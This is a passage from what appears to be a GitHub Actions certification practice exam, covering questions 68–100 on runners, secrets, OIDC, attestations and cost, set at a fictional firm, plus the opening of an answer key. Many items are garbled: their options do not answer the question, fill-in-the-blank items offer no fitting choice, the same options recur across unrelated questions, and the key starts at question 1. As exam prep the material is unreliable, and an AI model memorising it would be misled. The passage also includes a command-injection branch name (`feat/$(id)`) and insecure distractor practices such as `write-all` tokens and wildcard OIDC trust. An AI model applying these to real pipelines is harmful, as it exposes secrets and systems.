- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 68. In `heliosgrid/meter-sync`, an automated Dependabot auto-merge helper workflow runs `gh pr review --approve` using `${{ secrets.GITHUB_TOKEN }}` and receives `403 GitHub Actions is not permitted to create or approve pull requests`. Which policy blocked the call, and why is it disabled by default?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 69. Under `Organization -> Settings -> Actions -> General`, HeliosGrid Telemetry selects `Allow heliosgrid, and select non-heliosgrid, actions and reusable workflows`, leaves `Allow actions created by GitHub` checked, and enters pattern `aws-actions/*` in the allowlist. Which actions are permitted to execute inside `heliosgrid` repositories?

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 70. HeliosGrid Telemetry operates self-hosted hardware-in-the-loop runners in private repository `heliosgrid/substation-fw` where external contractors have `Read` fork access. Which repository-level `Fork pull request workflows` setting prevents unauthorized contractor fork PRs from executing on private self-hosted runners without maintainer approval?

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 71. Following a third-party CI supply-chain advisory, HeliosGrid Telemetry's CISO mandates technical guardrails so no repository can run unapproved or mutable external actions or merge PRs without passing central security checks. Which three controls enforce this end-to-end? Select three.

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)
- **D.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **E.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 72. HeliosGrid Telemetry scales Kubernetes container runners via GA Actions Runner Controller (`gha-runner-scale-set` Helm chart) and needs inner workflow steps to run `docker build` WITHOUT mounting the Kubernetes node's privileged `/var/run/docker.sock`. Which two ARC container modes support container steps or `docker build` cleanly?

- **A.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 73. To register ephemeral VM runners on-demand without ever saving a long-lived registration token on the VM disk, HeliosGrid Telemetry's autoscaler calls REST endpoint `POST /orgs/heliosgrid/actions/runners/____`, passes the returned `encoded_jit_config` to `./run.sh --jitconfig`, and terminates the VM on exit. Complete the REST endpoint suffix.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 74. HeliosGrid Telemetry provisions autoscaling Kubernetes ARC runners (`gha-runner-scale-set`) on an internal EKS cluster to run private firmware builds with Immutable Actions enabled. Order the GitHub App authentication, Runner Group isolation, Helm scale-set deployment, and egress firewall steps.

- **A.** Authenticate ARC with a personal developer PAT → Enable `Allow public repositories` on the Runner Group → Mount host `/var/run/docker.sock` across stateful pods → Block `*.actions.githubusercontent.com` and `ghcr.io` on the firewall
- **B.** Bake `./config.sh` `.runner` files into a VM image cloned across 20 pods → Attach an `arm64` macOS Larger runner to Azure VNet → Store cluster kubeconfigs in plain-text `vars.*` → Ignore queue metrics
- **C.** Deploy deprecated `summerwind` webhook ARC with inbound port 443 open → Skip Runner Group scoping across all org repos → Keep persistent workspaces across unrelated jobs → Disable Kubernetes RBAC
- **D.** Create an org GitHub App (`runner` perms) & K8s Secret → Create a Runner Group (`no Public repos`; scoped repos) → Deploy `gha-runner-scale-set` controller + scale set (`min: 0`) → Allow egress to `github.com`, `*.actions...`, and `ghcr.io`

### 75. HeliosGrid Telemetry wants Apple Silicon `macos-15-large` Larger runners to connect directly into a private Azure Virtual Network (`GitHub.Network/networkSettings`) alongside `ubuntu-24.04-16core` Larger runners. Why does associating the macOS Larger runner with the Azure VNet network configuration fail?

- **A.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **D.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`

### 76. HeliosGrid Telemetry configures Azure Private Networking (`VNet integration`) for GitHub Enterprise Cloud Linux Larger runners in `eastus2`. Which two Azure and GitHub setup requirements are mandatory? Select two.

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **C.** Attach **Azure Private Networking** (`GitHub.Network/networkSettings`) to Linux/Windows Larger runners and allow `*.actions.githubusercontent.com` (`pkg.actions...`) + `ghcr.io` on firewalls
- **D.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 77. A self-hosted runner inside HeliosGrid Telemetry's substation lab trusts internal Root CA `/etc/ssl/certs/substation-root.pem`, yet Node.js actions (`actions/checkout`) fail with `UNABLE_TO_GET_ISSUER_CERT_LOCALLY`. Complete the `.env` variable `____=/etc/ssl/certs/substation-root.pem` so Node.js actions trust the custom CA.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`

### 78. HeliosGrid Telemetry registers 40 self-hosted runners at the Enterprise level inside Enterprise Runner Group `ot-hil-racks`. For `heliosgrid/rtu-agent` in organization `heliosgrid` to use `ot-hil-racks`, complete the two-tier access chain: grant `____` on the Enterprise Runner Group, then grant `Repository access` inside org `heliosgrid`.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`

### 79. Operations engineers at HeliosGrid Telemetry audit self-hosted runner health, disk saturation, and queue latency across 12 Runner Groups. Which two monitoring and hygiene practices prevent runner outages and cross-job contamination? Select two.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Deploy ephemeral `ARC` (`gha-runner-scale-set`) or Larger runners inside **Runner Groups** restricted to selected orgs, selected repos, and trusted workflow paths (`never Public repos`)
- **E.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **F.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`

### 80. A security audit flags Runner Group `default` in organization `heliosgrid` because `Allow public repositories` was accidentally toggled ON while 6 stateful self-hosted Linux VMs sit in `default`. What severe attack vector does `Allow public repositories` open on self-hosted runners?

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`

### 81. HeliosGrid Telemetry builds a custom Ubuntu 24.04 runner VM image preloaded with Go `1.23.2` under `/opt/hostedtoolcache/go/1.23.2/x64/`, yet `actions/setup-go@v5` ignores the local cache and tries a remote download. Complete the missing marker filename `/opt/hostedtoolcache/go/1.23.2/____`.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 82. Before every job starts on HeliosGrid Telemetry's self-hosted hardware-bench runners, admin script `/usr/local/libexec/verify-usb-dongle.sh` must run automatically without relying on repo YAML. Complete the runner `.env` hook key: `____=/usr/local/libexec/verify-usb-dongle.sh`.

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs

### 83. HeliosGrid Telemetry defines Organization variable `MQTT_REGION = us-west` (`Selected repositories`), Repository variable `MQTT_REGION = us-central`, and NO `MQTT_REGION` variable on Environment `staging`. When a job targeting `environment: staging` evaluates `${{ vars.MQTT_REGION }}`, what value resolves?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)

### 84. An enterprise administrator configures Organization secrets in `heliosgrid` (`GitHub Enterprise Cloud`) across `Public`, `Private`, and `Internal` repositories. Which two visibility and naming constraints apply to Organization Actions secrets? Select two.

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Scope sensitive credentials via `Environment > Repository > Organization` `secrets.*` (`encrypted via LibSodium on REST API`) and store plain-text parameters in `vars.*`
- **D.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)
- **E.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 85. HeliosGrid Telemetry's automated credential broker rotates Organization Actions secret `GRID_SIGNING_TOKEN` every 24 hours across a curated list of `Private` repositories via the GitHub REST API. Place the token minting, public-key lookup, LibSodium sealed-box encryption, and `PUT` request steps in exact order.

- **A.** Mint an App token (`organization_actions_secrets: write`) → GET `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`) → Encrypt value client-side via LibSodium `crypto_box_seal` → PUT `/orgs/{org}/actions/secrets/{name}` (`selected` repos)
- **B.** Name the secret `GITHUB_API_KEY` (`reserved GITHUB_ prefix`) → Upload a `96 KB` secret (`exceeding the 48 KB cap`) → Send unauthenticated curl calls → Expect Org secrets to override `production` Environment secrets
- **C.** Commit the encrypted blob into `.github/workflows/rotate.yml` → Encrypt with a local AES passphrase unknown to GitHub → Issue `admin:enterprise` classic PATs everywhere → Reboot self-hosted runners to load secrets
- **D.** POST the plaintext secret to `/orgs/{org}/actions/variables` → Base64-encode without LibSodium encryption → Set `visibility: "all"` exposing secrets to `Public` repos → Read plaintext back via `GET /orgs/{org}/actions/secrets/{name}`

### 86. A workflow in `heliosgrid/meter-sync` stores a Base64-encoded TLS client certificate in `secrets.CLIENT_CERT_B64`, decodes it to PEM inside bash, and accidentally prints an unmasked decoded line when `set -x` is enabled. Why wasn't the decoded PEM line automatically redacted by GitHub's log masker?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`

---

## Domain 5 — Secure and optimize automation (10–15% official weight · 14 questions)

### 87. HeliosGrid Telemetry configures Deployment Environment `substation-prod` with a `Wait timer` of `30` minutes, `Required reviewers: @heliosgrid/grid-ops`, and a `Deployment branch policy` allowing ONLY `release/*` branches. When a workflow triggered from `feat/test` references `environment: substation-prod`, what happens?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)

### 88. Your AppSec team evaluates a community GitHub Marketplace action `community-user/helm-diff@v1` before adding its SHA to the enterprise allowlist. Which files inside the action repository MUST be audited for hidden network calls or credential exfiltration (`especially for JavaScript and Docker actions`)?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 89. In `heliosgrid/dispatch-hub`, a workflow uses `actions/github-script@v7` to parse `github.event.issue.body`. Proposed solution: Interpolate ``script: const body = `${{ github.event.issue.body }}`;`` directly inside the JavaScript string in YAML so `github-script` reads the issue body. Does this meet the goal?

- **A.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **B.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **C.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 90. During a red-team review of `heliosgrid/open-modbus`, auditors test untrusted branch names (`feat/$(id)`), PR titles, and commit author names across workflows. Which two contexts/fields MUST be treated as attacker-controlled untrusted input in `run:` scripts? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`
- **D.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **E.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **F.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`

### 91. A CodeQL SARIF upload workflow in `heliosgrid/grid-ingest` fails with `Resource not accessible by integration` after an admin sets workflow-level `permissions: {}`. Complete the minimal job-level `permissions:` mapping needed strictly to check out code and upload SARIF alerts to GitHub Security: `contents: read` and `____: write`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 92. Why is a short-lived GitHub App installation token (`minted in-job via actions/create-github-app-token`) strongly preferred over storing a long-lived classic PAT (`repo` scope) in Organization secrets for cross-repository automation?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 93. HeliosGrid Telemetry authenticates workflows in `heliosgrid/*` to an internal HashiCorp Vault cluster (`https://vault.heliosgrid.internal`) via OIDC instead of the default cloud URL audience. Which `@actions/core` (`or login action audience input`) capability customizes the OIDC JWT `aud` claim so tokens minted for Vault cannot be replayed against AWS/Azure?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 94. HeliosGrid Telemetry transitions `heliosgrid/grid-ingest` GCP Cloud Run production deployments from JSON service-account keys to Workload Identity Federation (`OIDC`) gated by `production` Environment reviewers. Order the end-to-end setup and runtime exchange steps.

- **A.** Set cloud OIDC trust `sub` to wildcard `repo:*:*` → Omit `permissions: id-token: write` on the job → Leave `environment:` unset while expecting reviewer gates to pause → Store static cloud root keys in `vars.*`
- **B.** Run deploy on `pull_request_target` checking out untrusted fork PR code → Set `permissions: write-all` globally → Request OIDC tokens before Environment reviewers approve → Print cloud tokens to `$GITHUB_STEP_SUMMARY`
- **C.** Gate `production` Environment (`reviewers`, `main`) → Pin cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production` → Set `environment: production` & `id-token: write` → Exchange OIDC JWT at runtime & purge static keys
- **D.** Save a static OIDC JWT inside `secrets.OIDC_JWT` once a month → Disable TLS verification on cloud login steps → Skip `aud` validation in Vault → Allow developers to self-approve their own `production` runs

### 95. HeliosGrid Telemetry must prove NERC-CIP firmware provenance (`SLSA Build Level 3`) for `rtu-agent.elf` built in an enterprise reusable workflow before substation deployers install the binary. Place the workflow permissions, build, Sigstore attestation signing, and `gh attestation verify` gate steps in exact order.

- **A.** Grant `id-token: write` & `attestations: write` in reusable CI → Build artifact / immutable `sha256:` image digest → Sign SLSA provenance via `actions/attest-build-provenance` → Verify via `gh attestation verify -R <o>/<r> --signer-workflow`
- **B.** Compile binaries on an unmonitored developer laptop outside Actions → Upload unsigned binaries to a public bucket → Pin third-party actions to floating `@main` → Delete attestation bundles prior to admission checks
- **C.** Compute an unsigned `md5sum` in bash → Commit private PGP signing keys into Git → Run `gh attestation verify` without `-R` / `--owner` → Disable Immutable Releases on prod artifacts
- **D.** Run `attest-build-provenance` with `permissions: read-all` only → Attest a mutable `:latest` image tag with no `sha256:` digest → Skip verification at deploy time → Edit build steps locally in caller repos

### 96. HeliosGrid Telemetry enables `Immutable releases` on `heliosgrid/rtu-agent` alongside GitHub Artifact Attestations (`actions/attest-sbom` + `actions/attest-build-provenance`). Once a non-draft GitHub Release is published with Immutable Releases active, what modifications are blocked?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **C.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 97. In `heliosgrid/firmware-sdk`, 8 parallel matrix jobs each upload test XML via `actions/upload-artifact@v4` with identical `name: ctest-results` expecting v4 to merge all 8 uploads into one artifact automatically. Proposed solution: Pass the same static `name: ctest-results` to `actions/upload-artifact@v4` across all 8 parallel matrix jobs. Does this meet the goal?

- **A.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 98. HeliosGrid Telemetry's Docker image builds in `heliosgrid/grid-ingest` rebuild 14 unchanged base C++ layers (`19 minutes`) on every PR and upload `600 MB` uncompressed debug tarballs kept for `90 days`. Which two optimizations cut build wall-clock time and storage usage? Select two.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Enable `concurrency: { cancel-in-progress: true }` on PR branches, cache dependencies with `actions/cache@v4`, lower `retention-days`, and prefer Linux (`1x`) over macOS (`10x`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 99. HeliosGrid Telemetry runs 400 daily PR labeler, issue-triage, and JSON schema check jobs that finish in 12 seconds without Docker containers, currently billed on 4-core Linux Larger runners. Complete the lightweight single-vCPU hosted runner label `runs-on: ____` that minimizes cost for small non-Docker tasks.

- **A.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 100. In `heliosgrid/monorepo`, editing a single microservice under `services/billing/` currently triggers a 36-job integration matrix across all 9 microservices. How do you dynamically prune the matrix on pull requests without breaking required branch-protection status checks?

- **A.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

---

## Answer Key and Explanations

### Question 1 — `A` (Author and manage workflows)

Correct answer: A (is correct). No — `on: schedule` workflows trigger ONLY from the workflow file committed on the repository's default branch (`main`), so a cron workflow present solely on `dev/substation` never executes automatically. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Correct. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
